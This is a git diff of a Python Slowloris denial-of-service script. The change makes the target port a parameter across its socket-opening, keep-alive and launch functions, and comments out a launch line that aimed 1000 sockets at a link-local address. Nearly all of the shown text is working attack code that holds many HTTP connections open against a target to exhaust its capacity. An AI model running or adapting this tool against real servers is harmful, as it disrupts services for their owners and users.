@@ -2,7 +2,7 @@ import socket
 import random
 import time
 
-PORT = 80
+
 #user agents list is retrieved from https://github.com/gkbrk/slowloris/blob/master/slowloris.py
 USER_AGENTS = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
@@ -30,11 +30,11 @@ USER_AGENTS = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"]
 
-def initialize_socket(ip):
+def initialize_socket(ip,port):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	#s.settimeout(4)
 	try:
-		s.connect((ip,PORT))
+		s.connect((ip,port))
 	#connection: keep-alive is enabled by HTTP 1.1 by default
 	except TimeoutError:
 		print("Timeout Happen")
@@ -48,7 +48,7 @@ def initialize_socket(ip):
 	return s
 
 
-def keep_connection(socket_list,ip):
+def keep_connection(socket_list,ip,port):
 	num_sock = len(socket_list)
 	while 1:
 		for s in socket_list:
@@ -62,24 +62,24 @@ def keep_connection(socket_list,ip):
 		renew_socket = num_sock - len(socket_list)
 		for _ in range(renew_socket):
 			try:
-				s = initialize_socket(ip)
+				s = initialize_socket(ip,port)
 			except socket.error:
 				break
 			socket_list.append(s)
 		print("renew {} sockets...sleep...".format(renew_socket))
 		time.sleep(15)
 
-def start_slowloris(ip,num_sock):
+def start_slowloris(ip,port,num_sock):
 	socket_list = []
 	for i in range(num_sock):
 		print("creating socket...{}".format(i))
-		s = initialize_socket(ip)
+		s = initialize_socket(ip,port)
 		if s is not None:
 			socket_list.append(s)
 
 	print("keep alive connection...")
-	keep_connection(socket_list,ip)
+	keep_connection(socket_list,ip,port)
 
-start_slowloris("169.254.75.164",1000)
+#	start_slowloris("169.254.75.164",1000)
 
 
